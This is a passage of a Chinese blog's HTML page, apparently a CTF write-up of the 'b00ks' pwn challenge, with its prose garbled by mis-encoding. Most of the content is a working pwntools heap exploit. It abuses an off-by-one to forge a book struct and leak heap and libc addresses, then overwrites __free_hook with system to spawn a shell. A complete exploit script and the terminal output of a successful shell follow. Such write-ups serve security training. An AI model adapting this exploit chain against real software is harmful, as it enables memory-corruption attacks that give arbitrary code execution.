class="line">        book_id = int(io.readline()[:-1])</span><br><span class="line">        io.readuntil(&quot;: &quot;)</span><br><span class="line">        book_name = io.readline()[:-1]</span><br><span class="line">        io.readuntil(&quot;: &quot;)</span><br><span class="line">        book_des = io.readline()[:-1]</span><br><span class="line">        io.readuntil(&quot;: &quot;)</span><br><span class="line">        book_author = io.readline()[:-1]</span><br><span class="line">    return book_id, book_name, book_des, book_author</span><br><span class="line">def changeauthor(authorname):</span><br><span class="line">    io.readuntil(&quot;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;5&quot;)</span><br><span class="line">    io.readuntil(&quot;Enter author name: &quot;)</span><br><span class="line">    io.sendline(authorname)</span><br></pre></td></tr></table></figure>

<p>å¼€å§‹å°è¯•</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(&quot;author name:&quot;)</span><br><span class="line">io.sendline(&quot;A&quot; * 30 + &quot;KK&quot;)</span><br><span class="line">createbook(150, &quot;kkbook1&quot;, 0x100, &quot;haha&quot;) #æˆ‘ä»¬çš„book1ä¸èƒ½å¤ªå°ï¼Œä¸ç„¶ä¼ªé€ çš„book1å°±ä¸èƒ½è½åœ¨æ­£ç¡®çš„åœ°æ–¹ï¼Œæ— æ³•æ³„éœ²ã€‚[è¿™é‡Œæˆ‘è°ƒè¯•äº†å¾ˆå¤šæ¬¡ï¼Œæ³¨æ„çœ‹å †å¸ƒç½®ï¼Œå¤šè¯•è¯•</span><br><span class="line">gdb.attach(io)</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶åœ¨gdbçª—å£ä¸­æŸ¥çœ‹æˆ‘ä»¬çš„å†…å­˜æ˜¯è¿™æ ·å­çš„ğŸ‘‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/10gx 0x5566bb2af040</span><br><span class="line">0x5566bb2af040:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x5566bb2af050:	0x4141414141414141	0x4b4b414141414141</span><br><span class="line">0x5566bb2af060:	0x00005566bc79e0f0	0x0000000000000000</span><br><span class="line">0x5566bb2af070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5566bb2af080:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>æ¥ç€é€‰æ‹©printå‡½æ•°ï¼Œå°±å¯ä»¥å¾—åˆ°book1åœ°å€</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">book1_id,book1_name,book1_des,book_author=printbook(1)</span><br><span class="line">book1_addr=u64(book_author[32:32+6].ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &quot;book1_addr ==&gt; 0x%x&quot;%book1_addr</span><br></pre></td></tr></table></figure>

<p>ç¼–è¾‘book1çš„description</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;a&quot; * 0x40 + p64(0x01) + p64(book1_addr + 0x38)*2 + p64(0xffff)</span><br><span class="line">editbook(1, payload)		#fake_book1</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æˆ‘ä»¬ä¿®æ”¹ä½œè€…ï¼Œä½¿book1åœ°å€æŒ‡å‘book1_des</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">changeauthor(&quot;a&quot; * 30 + &quot;OO&quot;)</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºbook2ï¼Œè¦æŠŠsizeè®¾ç½®çš„å¾ˆå¤§ï¼Œä½¿mallocç”¨mmap()åˆ†é…</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">createbook(1000000, &quot;kkbook2&quot;, 1000000, &quot;hello world&quot;)</span><br></pre></td></tr></table></figure>

<p>gdbè°ƒè¯•ï¼Œçœ‹çœ‹æˆ‘å¸ƒç½®çš„å †æ ˆæ˜¯ä»€ä¹ˆæ ·å­çš„</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/10gx 0x55a03fde01d0</span><br><span class="line">0x55a03fde01d0:	0x0000000000000001	0x000055a03fde0020</span><br><span class="line">0x55a03fde01e0:	0x000055a03fde00c0	0x0000000000000100</span><br><span class="line">0x55a03fde01f0:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x55a03fde0200:	0x0000000000000002	0x00007f2db34c8010</span><br><span class="line">0x55a03fde0210:	0x00007f2db2ef5010	0x00000000000f4240</span><br><span class="line">gdb-peda$ x/10gx 0x55a03fde0100 ==&gt;fake_book1</span><br><span class="line">0x55a03fde0100:	0x0000000000000001	0x000055a03fde0208</span><br><span class="line">0x55a03fde0110:	0x000055a03fde0208	0x000000000000ffff</span><br><span class="line">0x55a03fde0120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a03fde0130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a03fde0140:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>å†çœ‹çœ‹æ›´ç›´è§‚çš„å †å¸ƒç½®</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/20gx 0x55a03fde00b0</span><br><span class="line">0x55a03fde00b0:	0x0000000000000000	0x0000000000000111</span><br><span class="line">0x55a03fde00c0:	0x6161616161616161	0x6161616161616161 ==&gt;&quot;a&quot; * 0x30</span><br><span class="line">0x55a03fde00d0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55a03fde00e0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55a03fde00f0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55a03fde0100:	0x0000000000000001	0x000055a03fde0208 ==&gt;fake_book1</span><br><span class="line">0x55a03fde0110:	0x000055a03fde0208	0x000000000000ffff</span><br><span class="line">0x55a03fde0120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a03fde0130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a03fde0140:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>æ‰“å°å‡ºbook1çš„descriptionï¼Œé‡Œé¢å°±æ˜¯æŒ‡å‘äº†book2çš„ä¿¡æ¯ï¼Œæ‰€ä»¥å¾—åˆ°book2çš„æŒ‡é’ˆåœ°å€</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">book_id, book_name, book_des, book_author = printbook(1)</span><br><span class="line">book2_name_addr = u64(book_name.ljust(8, &quot;\x00&quot;))</span><br><span class="line">book2_des_addr = u64(book_des.ljust(8, &quot;\x00&quot;))</span><br><span class="line">print &quot;book2_name_addr ==&gt; 0x%x&quot;%book2_name_addr</span><br><span class="line">print &quot;book2_des_addr ==&gt; 0x%x&quot;%book2_des_addr</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹<code>vmmap</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ vmmap</span><br><span class="line">Start              End                Perm	Name</span><br><span class="line">0x000055a03e99e000 0x000055a03e9a0000 r-xp	/home/kk/Desktop/black/wiki/off_by_one/b00ks/b00ks</span><br><span class="line">0x000055a03eb9f000 0x000055a03eba0000 r--p	/home/kk/Desktop/black/wiki/off_by_one/b00ks/b00ks</span><br><span class="line">0x000055a03eba0000 0x000055a03eba1000 rw-p	/home/kk/Desktop/black/wiki/off_by_one/b00ks/b00ks</span><br><span class="line">0x000055a03fddf000 0x000055a03fe01000 rw-p	[heap]</span><br><span class="line">0x00007f2db2ef5000 0x00007f2db2fea000 rw-p	mapped</span><br><span class="line">0x00007f2db2fea000 0x00007f2db31aa000 r-xp	/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007f2db31aa000 0x00007f2db33aa000 ---p	/lib/x86_64-linux-gnu/libc-2.23.so</span><br></pre></td></tr></table></figure>

<p>è®¡ç®—offset = book2_name_addr - 0x00007f2db2fea000 = 0x4de010</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc_base = book2_name_addr - 0x4de010</span><br><span class="line">print &quot;libc_base ==&gt; 0x%x&quot;%libc_base</span><br></pre></td></tr></table></figure>

<p>åœ¨æœ¬åœ°è¿›è¡Œæµ‹è¯•ï¼Œæ‰€ä»¥libcç”¨<code>ldd</code>æŸ¥çœ‹è·¯å¾„ï¼Œæ¯”èµ›ä¸ç»™libcæ–‡ä»¶æ—¶å†æƒ³åŠæ³•è¿›è¡Œæ³„éœ²ï¼Œè„šæœ¬æ”¹ä¸€ä¸‹å°±è¡Œäº†<br>å°†<code>__free_hook</code>å’Œ<code>system(&quot;/bin/sh&quot;)</code>å†™å…¥ç›¸åº”ä½ç½®ï¼Œfreeåè°ƒç”¨ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">free_hook_addr = libc_base + libc.symbols[&quot;__free_hook&quot;]</span><br><span class="line">system_addr = libc_base + libc.symbols[&quot;system&quot;]</span><br><span class="line">binsh_addr = libc_base + libc.search(&quot;/bin/sh&quot;).next()</span><br><span class="line"></span><br><span class="line">editbook(1, p64(binsh_addr) + p64(free_hook_addr))</span><br><span class="line">editbook(2, p64(system_addr))</span><br><span class="line"></span><br><span class="line">deletebook(2)</span><br></pre></td></tr></table></figure>

<h3 id="ğŸ“‚å®Œæ•´EXP"><a href="#ğŸ“‚å®Œæ•´EXP" class="headerlink" title="ğŸ“‚å®Œæ•´EXP"></a>ğŸ“‚å®Œæ•´EXP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/env python</span><br><span class="line">#coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line"># context.log_level=&quot;debug&quot;</span><br><span class="line"></span><br><span class="line">io = process(&quot;./b00ks&quot;)</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">def createbook(name_size, name, des_size, des):</span><br><span class="line">    io.readuntil(&quot;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">    io.readuntil(&quot;: &quot;)</span><br><span class="line">    io.sendline(str(name_size))</span><br><span class="line">    io.readuntil(&quot;: &quot;)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.readuntil(&quot;: &quot;)</span><br><span class="line">    io.sendline(str(des_size))</span><br><span class="line">    io.readuntil(&quot;: &quot;)</span><br><span class="line">    io.sendline(des)</span><br><span class="line"></span><br><span class="line">def deletebook(id):</span><br><span class="line">    io.readuntil(&quot;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">    io.readuntil(&quot;: &quot;)</span><br><span class="line">    io.sendline(str(id))</span><br><span class="line"></span><br><span class="line">def editbook(id, new_des):</span><br><span class="line">    io.readuntil(&quot;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line">    io.readuntil(&quot;: &quot;)</span><br><span class="line">    io.sendline(str(id))</span><br><span class="line">    io.readuntil(&quot;: &quot;)</span><br><span class="line">    io.sendline(new_des)</span><br><span class="line"></span><br><span class="line">def printbook(id):</span><br><span class="line">    io.readuntil(&quot;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;4&quot;)</span><br><span class="line">    io.readuntil(&quot;: &quot;)</span><br><span class="line">    for i in range(id):</span><br><span class="line">        book_id = int(io.readline()[:-1])</span><br><span class="line">        io.readuntil(&quot;: &quot;)</span><br><span class="line">        book_name = io.readline()[:-1]</span><br><span class="line">        io.readuntil(&quot;: &quot;)</span><br><span class="line">        book_des = io.readline()[:-1]</span><br><span class="line">        io.readuntil(&quot;: &quot;)</span><br><span class="line">        book_author = io.readline()[:-1]</span><br><span class="line">    return book_id, book_name, book_des, book_author</span><br><span class="line"></span><br><span class="line">def changeauthor(authorname):</span><br><span class="line">    io.readuntil(&quot;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;5&quot;)</span><br><span class="line">    io.readuntil(&quot;: &quot;)</span><br><span class="line">    io.sendline(authorname)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;author name:&quot;)</span><br><span class="line">io.sendline(&quot;A&quot; * 30 + &quot;KK&quot;)</span><br><span class="line"></span><br><span class="line">createbook(150, &quot;kkbook1&quot;, 0x100, &quot;haha&quot;)</span><br><span class="line"></span><br><span class="line">book1_id,book1_name,book1_des,book_author=printbook(1)</span><br><span class="line">book1_addr=u64(book_author[32:32+6].ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &quot;book1_addr ==&gt; 0x%x&quot;%book1_addr</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot; * 0x40 + p64(0x01) + p64(book1_addr + 0x38)*2 + p64(0xffff)</span><br><span class="line">editbook(1, payload)		#fake_book1</span><br><span class="line"></span><br><span class="line">createbook(1000000, &quot;kkbook2&quot;, 1000000, &quot;hello world&quot;)</span><br><span class="line"></span><br><span class="line">changeauthor(&quot;a&quot; * 30 + &quot;OO&quot;)</span><br><span class="line"></span><br><span class="line">book_id, book_name, book_des, book_author = printbook(1)</span><br><span class="line">book2_name_addr = u64(book_name.ljust(8, &quot;\x00&quot;))</span><br><span class="line">book2_des_addr = u64(book_des.ljust(8, &quot;\x00&quot;))</span><br><span class="line">print &quot;book2_name_addr ==&gt; 0x%x&quot;%book2_name_addr</span><br><span class="line">print &quot;book2_des_addr ==&gt; 0x%x&quot;%book2_des_addr</span><br><span class="line"></span><br><span class="line">libc_base = book2_name_addr - 0x4de010</span><br><span class="line">print &quot;libc_base ==&gt; 0x%x&quot;%libc_base</span><br><span class="line"></span><br><span class="line">free_hook_addr = libc_base + libc.symbols[&quot;__free_hook&quot;]</span><br><span class="line">system_addr = libc_base + libc.symbols[&quot;system&quot;]</span><br><span class="line">binsh_addr = libc_base + libc.search(&quot;/bin/sh&quot;).next()</span><br><span class="line"></span><br><span class="line">editbook(1, p64(binsh_addr) + p64(free_hook_addr))</span><br><span class="line">editbook(2, p64(system_addr))</span><br><span class="line"></span><br><span class="line">deletebook(2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>ç»ˆäºæˆåŠŸäº†orz</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~/Desktop/black/wiki/off_by_one/b00ks$ python exp.py </span><br><span class="line">[+] Starting local process &apos;./b00ks&apos;: pid 78110</span><br><span class="line">[*] &apos;/lib/x86_64-linux-gnu/libc.so.6&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">book1_addr ==&gt; 0x55b3b00ff1d0</span><br><span class="line">book2_name_addr ==&gt; 0x7fc82a684010</span><br><span class="line">book2_des_addr ==&gt; 0x7fc82a684010</span><br><span class="line">libc_base ==&gt; 0x7fc82a1a6000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">b00ks  core  exp.py  peda-session-b00ks.txt</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

  
	  </div>
		  <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/CTF/">CTF</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/pwn/">pwn</a><a href="/tags/wp/">wp</a>
  </div>

</div>



</footer>

   	       
	  </article>
	  
<nav class="article-nav clearfix">
 
 <div class="prev" >
 <a href="/2019/10/03/keypatch/keypatch/" title="IDAæ’ä»¶keypatchåˆä½“éªŒ">
  <span>
  IDAæ’ä»¶keypatchåˆä½“éªŒ</span>
</a>
</div>


<div class="next">
<a href="/2019/09/10/hdu/hdu/"  title="HDU by javaï¼ˆå¾ˆå°‘éƒ¨åˆ†ï¼‰ &amp;&amp; javaå­¦ä¹ ">
 <span>HDU by javaï¼ˆå¾ˆå°‘éƒ¨åˆ†ï¼‰ &amp;&amp; javaå­¦ä¹ 
</span>
</a>
</div>

</nav>

	  

</div> 
      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
<aside class="clearfix">
<div id="authorInfo">
	
		<div class="author-img"></div>		
	
	<div class="social-info" class="clearfix">
		
		<a href="http://weibo.com/https://weibo.com/u/5213203661?refer_flag=0000015010_&amp;from=feed&amp;loc=nickname" target="_blank" class="icon-weibo" title="å¾®åš"></a>
		
		
		<a href="https://github.com/p1Kk" target="_blank" class="icon-github" title="github"></a>
		
		
		
		
		
		
		
		
		
		
		<a href="mailto:p1kk_wang@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
		

	</div>
</div>

  
<div class="categorieslist">
	<p class="asidetitle">Categories</p>
		<ul>
		
		  
			<li><a href="/categories/ACM/" title="ACM">ACM<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/CTF/" title="CTF">CTF<sup>4</sup></a></li>
		  
		
		  
			<li><a href="/categories/oj/" title="oj">oj<sup>20</sup></a></li>
		  
		
		  
			<li><a href="/categories/æ¼æ´å¤ç°/" title="æ¼æ´å¤ç°">æ¼æ´å¤ç°<sup>10</sup></a></li>
		  
		
		  
			<li><a href="/categories/ç¬”è®°/" title="ç¬”è®°">ç¬”è®°<sup>24</sup></a></li>
		  
		
		</ul>
</div>


  
<div class="tagslist">
	<p class="asidetitle">Tags</p>
		<ul class="clearfix">
		
			
				<li><a href="/tags/pwn/" title="pwn">pwn<sup>38</sup></a></li>
			
		
			
				<li><a href="/tags/wp/" title="wp">wp<sup>24</sup></a></li>
			
		
			
				<li><a href="/tags/tw/" title="tw">tw<sup>16</sup></a></li>
			
		
			
				<li><a href="/tags/iot/" title="iot">iot<sup>15</sup></a></li>
			
		
			
				<li><a href="/tags/ç¬”è®°/" title="ç¬”è®°">ç¬”è®°<sup>11</sup></a></li>
			
		
			
				<li><a href="/tags/è·¯ç”±å™¨/" title="è·¯ç”±å™¨">è·¯ç”±å™¨<sup>9</sup></a></li>
			
		
			
				<li><a href="/tags/æ ˆæº¢å‡º/" title="æ ˆæº¢å‡º">æ ˆæº¢å‡º<sup>8</sup></a></li>
			
		
			
				<li><a href="/tags/å †/" title="å †">å †<sup>7</sup></a></li>
			
		
			
				<li><a href="/tags/cve/" title="cve">cve<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/ç¯å¢ƒæ­å»º/" title="ç¯å¢ƒæ­å»º">ç¯å¢ƒæ­å»º<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/æ ˆ/" title="æ ˆ">æ ˆ<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/æ”»é˜²ä¸–ç•Œ/" title="æ”»é˜²ä¸–ç•Œ">æ”»é˜²ä¸–ç•Œ<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/æ‘„åƒå¤´/" title="æ‘„åƒå¤´">æ‘„åƒå¤´<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/ubuntu18/" title="ubuntu18">ubuntu18<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/AWD/" title="AWD">AWD<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/å‘½ä»¤æ‰§è¡Œ/" title="å‘½ä»¤æ‰§è¡Œ">å‘½ä»¤æ‰§è¡Œ<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/å‘½ä»¤æ³¨å…¥/" title="å‘½ä»¤æ³¨å…¥">å‘½ä»¤æ³¨å…¥<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/è®¤è¯ç»•è¿‡/" title="è®¤è¯ç»•è¿‡">è®¤è¯ç»•è¿‡<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/å¾…å®Œå–„/" title="å¾…å®Œå–„">å¾…å®Œå–„<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/canary/" title="canary">canary<sup>1</sup></a></li>
			
		
		</ul>
</div>


  <div class="linkslist">
  <p class="asidetitle">Links</p>
    <ul>
        
          <li>
            
            	<a href="https://whali3n51.github.io" target="_blank" title="whali3n51">whali3n51</a>
            
          </li>
        
    </ul>
</div>

</aside>
</div>
    </div>
    <footer><div id="footer" >
	
	

	<p class="copyright">
	Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/hsihohuang/kiddochan" target="_blank" title="Kiddochan">Kiddochan</a> Â© 2024 
	
	<a href="/about" target="_blank" title="p1Kk">p1Kk</a>
	
	
	</p>
</div></footer>
    <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/jquery.qrcode-0.12.0.min.js"></script>

<script type="text/javascript">
$(document).ready(function(){ 
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
  
  $(window).resize(function(){
    getSize(); 
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else{
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
        
    }
  });
});
</script>

<script type="text/javascript">
$(document).ready(function(){ 
  var ai = $('.article-content>iframe'),
      ae = $('.article-content>embed'),
      t  = $('#toc'),
      ta = $('#toc.toc-aside'),
      o  = $('.openaside'),
      c  = $('.closeaside');
  if(ai.length>0){
    ai.wrap('<div class="video-container" />');
  };
  if(ae.length>0){
   ae.wrap('<div class="video-container" />');
  };
  c.click(function(){
    ta.css('display', 'block').addClass('fadeIn');
  });
  o.click(function(){
    ta.css('display', 'none');
  });
  $(window).scroll(function(){
    ta.css("top",Math.max(140,320-$(this).scrollTop()));
  });
});
</script>


<script type="text/javascript">
$(document).ready(function(){ 
  var $this = $('.share'),
      url = $this.attr('data-url'),
      encodedUrl = encodeURIComponent(url),
      title = $this.attr('data-title'),
      tsina = $this.attr('data-tsina'),
      description = $this.attr('description');
  var html = [
  '<div class="hoverqrcode clearfix"></div>',
  '<a class="overlay" id="qrcode"></a>',
  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
  '<a href="#qrcode" class="article-share-qrcode" title="å¾®ä¿¡"></a>',
  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="äººäºº"></a>',
  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="å¾®åš"></a>',
  '<span title="Share to"></span>'
  ].join('');
  $this.append(html);

  $('.hoverqrcode').hide();

  var myWidth = 0;
  function updatehoverqrcode(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
    var qrsize = myWidth > 1024 ? 200:100;
    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
    var p = $('.article-share-qrcode').position();
    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
                          .qrcode(options);
  };
  $(window).resize(function(){
    $('.hoverqrcode').hide();
  });
  $('.article-share-qrcode').click(function(){
    updatehoverqrcode();
    $('.hoverqrcode').toggle();
  });
  $('.article-share-qrcode').hover(function(){}, function(){
      $('.hoverqrcode').hide();
  });
});   
</script>









<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
$(document).ready(function(){ 
  $('.article-content').each(function(i){
    $(this).find('img').each(function(){
      if ($(this).parent().hasClass('fancybox')) return;
      var alt = this.alt;
      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
    });
    $(this).find('.fancybox').each(function(){
      $(this).attr('rel', 'article' + i);
    });
  });
  if($.fancybox){
    $('.fancybox').fancybox();
  }
}); 
</script>



<!-- Analytics Begin -->





<!-- Analytics End -->

<!-- Totop Begin -->

	<div id="totop">
	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
	</div>
	<script src="/js/totop.js"></script>

<!-- Totop End -->

<!-- MathJax Begin -->
<!-- mathjax config similar to math.stackexchange -->


<!-- MathJax End -->

<!-- Tiny_search Begin -->

<!-- Tiny_search End -->

  </body>
</html>
